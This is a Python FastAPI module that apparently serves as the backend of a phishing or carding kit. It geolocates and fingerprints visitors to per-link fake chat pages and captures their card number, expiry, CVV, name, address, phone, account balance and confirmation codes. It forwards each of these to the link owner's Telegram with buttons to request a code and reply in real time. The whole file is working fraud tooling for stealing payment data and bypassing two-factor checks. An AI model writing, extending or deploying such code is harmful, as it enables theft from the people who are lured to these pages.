import asyncio
import logging
import os
import secrets

import httpx
from fastapi import APIRouter, Request
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel
from user_agents import parse as ua_parse

from api.cache import (
    append_chat_message,
    check_heartbeat,
    create_chat_session,
    get_chat_session,
    get_chat_steps,
    pop_operator_reply,
    push_operator_reply,
    touch_heartbeat,
    update_chat_session_lang,
)
from db.crud.links import get_link_by_subdomain_and_id
from db.crud.users import get_or_create_user
from db.crud.visitors import get_or_create_visitor
from db.models import User
from db.session import get_session

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/chat")

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
NOTIFY_CHAT_ID = os.getenv("NOTIFY_CHAT_ID", "")
ADMIN_ID = os.getenv("ADMIN_ID", "")


# ── geo lookup ────────────────────────────────────────────────────────────────

async def _get_geo(ip: str) -> tuple[str, str]:
    """Returns (city, country). Falls back to ('?', '?') on any error."""
    try:
        async with httpx.AsyncClient(timeout=4) as client:
            r = await client.get(f"http://ip-api.com/json/{ip}?fields=city,country,status")
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    return data.get("city", "?"), data.get("country", "?")
    except Exception:
        pass
    return "?", "?"


def _parse_device(user_agent: str) -> str:
    """Returns a short device/OS string like 'Chrome 124 / Windows 10'."""
    if not user_agent:
        return "?"
    try:
        ua = ua_parse(user_agent)
        browser = ua.browser.family
        browser_ver = ua.browser.version_string.split(".")[0]
        os_name = ua.os.family
        os_ver = ua.os.version_string.split(".")[0]
        parts = []
        if browser and browser != "Other":
            parts.append(f"{browser} {browser_ver}".strip())
        if os_name and os_name != "Other":
            parts.append(f"{os_name} {os_ver}".strip())
        return " / ".join(parts) or "?"
    except Exception:
        return "?"


# ── translation ───────────────────────────────────────────────────────────────

def _translate_sync(text: str, dest: str) -> str:
    from deep_translator import GoogleTranslator
    result = GoogleTranslator(source="auto", target=dest).translate(text)
    return result or text


async def _translate(text: str, dest: str) -> str:
    for attempt in range(3):
        try:
            return await asyncio.to_thread(_translate_sync, text, dest)
        except Exception as exc:
            logger.warning("Translation attempt %d failed: %s", attempt + 1, exc)
            if attempt < 2:
                await asyncio.sleep(1.5 ** attempt)
    logger.error("Translation failed after 3 attempts, returning original text")
    return text


def _detect_lang(text: str) -> str:
    try:
        from langdetect import detect
        return detect(text) or "ru"
    except Exception:
        return "ru"

# ── models ────────────────────────────────────────────────────────────────────

class StartSession(BaseModel):
    subdomain: str
    link_id: str
    lang: str = "ru"
    user_agent: str = ""
    sys_lang: str = ""


class VisitorMessage(BaseModel):
    session_id: str
    subdomain: str
    link_id: str
    step: int | None = None
    trigger: str | None = None   # open | card | balance | error | user | code | code_resend
    text: str = ""
    # card data — sent once when balance trigger fires
    card_number: str = ""
    card_exp: str = ""
    card_cvv: str = ""
    card_name: str = ""
    country: str = ""
    address1: str = ""
    zip_code: str = ""
    city: str = ""
    phone_dial: str = ""
    phone: str = ""
    balance_amount: str = ""
    balance_currency: str = ""


# ── helpers ───────────────────────────────────────────────────────────────────

async def _resolve_owner(subdomain: str, link_id: str) -> tuple[str, int | None]:
    """Returns (display_string, tg_user_id)."""
    try:
        async with get_session() as session:
            link = await get_link_by_subdomain_and_id(session, subdomain, link_id)
            if link:
                owner = await session.get(User, link.user_id)
                if owner:
                    label = f"@{owner.username}" if owner.username else f"id:{owner.id}"
                    return label, owner.id
    except Exception as exc:
        logger.error("resolve_owner: %s", exc)
    return "неизвестен", None


async def _send_telegram(chat_id: str | int, text: str,
                         reply_markup: dict | None = None) -> None:
    if not BOT_TOKEN or not chat_id:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload: dict = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            r = await client.post(url, json=payload)
            if r.status_code != 200:
                logger.error("sendMessage failed: %s", r.text)
    except Exception as exc:
        logger.error("sendMessage exc: %s", exc)


# ── POST /chat/session ────────────────────────────────────────────────────────

@router.post("/session")
async def start_session(body: StartSession, request: Request) -> JSONResponse:
    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "?")
    )
    city, country = await _get_geo(ip)
    device = _parse_device(body.user_agent or request.headers.get("User-Agent", ""))
    sys_lang = body.sys_lang or body.lang

    async with get_session() as db:
        visitor, is_new = await get_or_create_visitor(
            db, ip=ip, city=city, country=country,
            device=device, sys_lang=sys_lang,
        )
        visitor_id = visitor.id

    session_id = secrets.token_urlsafe(16)
    await create_chat_session(
        session_id, body.subdomain, body.link_id,
        lang=body.lang, visitor_id=visitor_id,
        city=city, country=country, device=device, sys_lang=sys_lang,
    )
    return JSONResponse({"session_id": session_id, "visitor_id": visitor_id, "is_new": is_new})


# ── GET /chat/steps ───────────────────────────────────────────────────────────

@router.get("/steps")
async def get_steps(subdomain: str, link_id: str, lang: str = "ru") -> JSONResponse:
    steps = await get_chat_steps(subdomain, link_id)
    if lang and lang != "ru":
        translated = []
        for s in steps:
            s = dict(s)
            if s.get("text"):
                s["text"] = await _translate(s["text"], dest=lang)
            if s.get("button"):
                s["button"] = await _translate(s["button"], dest=lang)
            translated.append(s)
        steps = translated
    return JSONResponse(steps)


# ── POST /chat/message ────────────────────────────────────────────────────────

@router.post("/message")
async def visitor_message(body: VisitorMessage, request: Request) -> JSONResponse:
    if not body.text.strip() and not body.trigger:
        return JSONResponse({"ok": False, "error": "empty"}, status_code=400)

    sess = await get_chat_session(body.session_id)
    if not sess:
        await create_chat_session(body.session_id, body.subdomain, body.link_id)
        sess = await get_chat_session(body.session_id)

    # detect language from actual text; update session so replies go back in right lang
    if body.text.strip():
        visitor_lang = _detect_lang(body.text)
        if visitor_lang != (sess or {}).get("lang", "ru"):
            await update_chat_session_lang(body.session_id, visitor_lang)
    else:
        visitor_lang = (sess or {}).get("lang", "ru")

    ru_text = body.text
    if visitor_lang != "ru" and body.text.strip():
        ru_text = await _translate(body.text, dest="ru")

    await append_chat_message(body.session_id, "visitor", body.text)

    owner_label, owner_tg_id = await _resolve_owner(body.subdomain, body.link_id)
    ip = (
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or (request.client.host if request.client else "?")
    )

    sess_data = sess or {}
    visitor_id  = sess_data.get("visitor_id", "?")
    city        = sess_data.get("city", "?")
    country     = sess_data.get("country", "?")
    device      = sess_data.get("device", "?")
    sys_lang    = sess_data.get("sys_lang", visitor_lang)

    # format city/country
    geo_str = ", ".join(filter(lambda x: x and x != "?", [city, country])) or "?"

    trigger_label = {
        "open": "📂 открыл страницу",
        "card": "💳 открыл ввод карты",
        "balance": "💰 ввёл сумму баланса",
        "error": "⚠️ получил ошибку",
        "user": "✍️ написал сообщение",
        "code": "🔑 ввёл код подтверждения",
        "code_resend": "🔄 запросил повторную отправку кода",
    }.get(body.trigger or "user", "✍️ написал сообщение")

    is_new_marker = ""
    if sess_data.get("visitor_id"):
        # first message in this session is always trigger=open; mark new vs returning
        msgs_count = len(sess_data.get("msgs", []))
        is_new_marker = "🆕 Новый клиент" if msgs_count <= 1 else "🔄 Повторный клиент"

    header = (
        f"{is_new_marker} <b>#{visitor_id}</b> [{trigger_label}]\n"
        f"🔗 {body.subdomain}/{body.link_id}\n"
        f"🌍 {geo_str}\n"
        f"📱 {device}\n"
        f"🗣 {sys_lang}\n"
    )
    if visitor_lang != "ru" and ru_text != body.text:
        msg_body = f"<i>[{visitor_lang}→ru]</i> {ru_text}"
    else:
        msg_body = ru_text or f"<i>[{trigger_label}]</i>"

    # для кода — показываем сам код крупно, без перевода
    if body.trigger == "code" and body.text.strip():
        msg_body = f"🔑 <b>{body.text.strip()}</b>"

    # для баланса — добавляем данные карты и адреса в тело сообщения
    if body.trigger == "balance" and body.balance_amount:
        card_lines = []
        if body.card_number:
            card_lines.append(f"  Номер: <code>{body.card_number}</code>")
        if body.card_exp:
            card_lines.append(f"  Срок: <code>{body.card_exp}</code>")
        if body.card_cvv:
            card_lines.append(f"  CVV: <code>{body.card_cvv}</code>")
        if body.card_name:
            card_lines.append(f"  Имя: {body.card_name}")
        addr_lines = []
        if body.country:
            addr_lines.append(f"  Страна: {body.country}")
        if body.address1:
            addr_lines.append(f"  Адрес: {body.address1}")
        if body.zip_code or body.city:
            addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
        phone_str = ""
        if body.phone or body.phone_dial:
            phone_str = f"\n📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}"
        parts = [f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>"]
        if card_lines:
            parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
        if addr_lines:
            parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
        if phone_str:
            parts.append(phone_str.strip())
        msg_body = "\n\n".join(parts)

    reply_kb = {
        "inline_keyboard": [[
            {
                "text": "💬 Сообщение",
                "callback_data": f"wchat_reply:{body.session_id}:{visitor_lang}"
            },
            {
                "text": "🟢 Проверить онлайн",
                "callback_data": f"wchat_online:{body.session_id}"
            },
        ]]
    }

    # for balance trigger — add "Запросить код" button
    if body.trigger == "balance":
        reply_kb["inline_keyboard"].append([
            {
                "text": "🔑 Запросить код",
                "callback_data": f"wchat_reqcode:{body.session_id}"
            }
        ])

    # owner of the link gets the notification; fall back to global admin
    notify_id = owner_tg_id or ADMIN_ID or NOTIFY_CHAT_ID
    if notify_id:
        await _send_telegram(notify_id, header + msg_body, reply_markup=reply_kb)

    return JSONResponse({"ok": True})


# ── GET /chat/stream/{session_id} (SSE) ───────────────────────────────────────

@router.get("/stream/{session_id}")
async def chat_stream(session_id: str):
    async def event_gen():
        yield f"data: connected\n\n"
        while True:
            try:
                reply = await pop_operator_reply(session_id, timeout=25)
                if reply is not None:
                    import json as _json
                    if reply == "__request_code__":
                        payload = _json.dumps({"action": "request_code"}, ensure_ascii=False)
                    else:
                        payload = _json.dumps({"text": reply}, ensure_ascii=False)
                    yield f"data: {payload}\n\n"
                else:
                    yield f": ping\n\n"
            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.error("SSE error: %s", exc)
                break

    return StreamingResponse(
        event_gen(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )


# ── GET /chat/online/{session_id} ─────────────────────────────────────────────

@router.get("/online/{session_id}")
async def check_online(session_id: str) -> JSONResponse:
    """Returns whether the visitor is actively on the page (heartbeat-based)."""
    sess = await get_chat_session(session_id)
    if sess is None:
        # session expired entirely — definitely offline
        return JSONResponse({"online": False})
    alive = await check_heartbeat(session_id)
    return JSONResponse({"online": alive})


# ── POST /chat/heartbeat ───────────────────────────────────────────────────────

class HeartbeatBody(BaseModel):
    session_id: str


@router.post("/heartbeat")
async def heartbeat(body: HeartbeatBody) -> JSONResponse:
    """Called by the visitor's browser every ~20s to signal they are on the page."""
    await touch_heartbeat(body.session_id)
    return JSONResponse({"ok": True})
